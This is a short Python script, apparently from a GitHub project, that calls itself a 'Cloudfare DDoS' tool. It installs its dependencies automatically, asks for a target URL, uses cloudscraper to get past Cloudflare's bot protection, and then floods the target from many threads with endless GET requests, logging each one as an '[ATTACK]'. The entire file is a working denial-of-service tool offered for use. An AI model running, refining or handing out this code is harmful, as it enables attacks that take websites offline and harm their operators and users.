import os
import cloudscraper
import requests
import threading
from time import sleep
###################################################################
print(" ")                                                        
print("Otomatik Kurulum Yapılıyor Hiçbir Tuşa Basmayınız . . .")  #
os.system("pip3 install cloudscraper")                            #
os.system("pip3 install requests")                                #
print(" ")                                                        #
###################################################################
# check the target url
def check_url(url):
    try:
        cloudfare_check_url = requests.Session()
        response = cloudfare_check_url.get(url)
        if response.status_code == 200:
            print("[INFO] The url is valid")
        elif response.status_code == 404:
            print("[INFO] The url is invalid")
    except:
        bypass = cloudscraper.create_scraper()
        response2 = bypass.get(url)
        if response2.status_code == 200:
            print("[INFO]The url is valid")
        elif response2.status_code == 404:
            print("[INFO] The url is invalid")

count = 0

# ddos cloudfare
def bypass(url, threads):

    r = requests.Session()
    bypass2 = cloudscraper.create_scraper()

    def do_req():
        global count
        while True:
            response = r.get(url)
            count +=1

            print("\n" + f"[ATTACK] Status code: {response.status_code} Request number: {count}" + "\n")

            response = bypass2.get(url)
            print("\n" + f"[ATTACK]Status code: {response.status_code} Request number: {count}" + "\n")

    list_of_threads = []

    for i in range(int(threads)):
        t = threading.Thread(target=do_req)
        t.daemon = True
        # appending all the threads to the list of threads
        list_of_threads.append(t)

    for i in range(int(threads)):
        #starting the threads
        list_of_threads[i].start()

    for i in range(int(threads)):
        #joining the threads
        list_of_threads[i].join()

print(
    """
    
      ____ _                 _  __                  ____  ____       ____  
     / ___| | ___  _   _  __| |/ _| __ _ _ __ ___  |  _ \|  _ \  ___/ ___|   ~>Cloudfare DDoS<~ 
    | |   | |/ _ \| | | |/ _` | |_ / _` | '__/ _ \ | | | | | | |/ _ \___ \  ~~>Made by tfwcodes(github)<~~
    | |___| | (_) | |_| | (_| |  _| (_| | | |  __/ | |_| | |_| | (_) |__) |
     \____|_|\___/ \__,_|\__,_|_|  \__,_|_|  \___| |____/|____/ \___/____/ 
    
    
    """
)

url = input("[INFO] Enter the target url: ")
check_url(url)
sleep(1)

threads = input("[INFO] Enter the number of threads: ")
bypass(url, threads)
